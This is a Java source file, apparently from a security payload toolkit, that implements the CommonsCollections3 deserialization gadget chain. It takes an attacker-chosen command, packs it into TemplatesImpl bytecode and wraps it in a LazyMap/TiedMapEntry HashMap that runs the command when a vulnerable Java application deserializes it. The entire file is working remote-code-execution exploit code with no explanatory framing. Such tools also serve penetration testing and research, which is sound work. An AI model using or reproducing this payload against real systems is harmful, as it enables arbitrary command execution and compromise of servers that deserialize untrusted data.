package com.xyuxu.javasec.core.payload.gadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;


public class CommonsCollections3 implements ObjectPayload<Object> {

    @Override
    public Map getObject(final String command) throws Exception {

        final TemplatesImpl templates = TemplatesBytecodeGenerator.createTemplatesImpl(command);

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
        };

        final ChainedTransformer transformerChain = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(1)
                }
        );

        final Map<Object, Object> innerMap = new HashMap<>();
        final Map<Object, Object> lazyMap = LazyMap.decorate(innerMap, new ConstantTransformer(1));

        final TiedMapEntry triggerEntry = new TiedMapEntry(lazyMap, "JavaSec");
        final Map<Object, Object> finalMap = new HashMap<>();
        finalMap.put(triggerEntry, "any-value");

        Reflections.setFieldValue(lazyMap, "factory", transformerChain);
        lazyMap.remove("JavaSec");
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return finalMap;
    }
}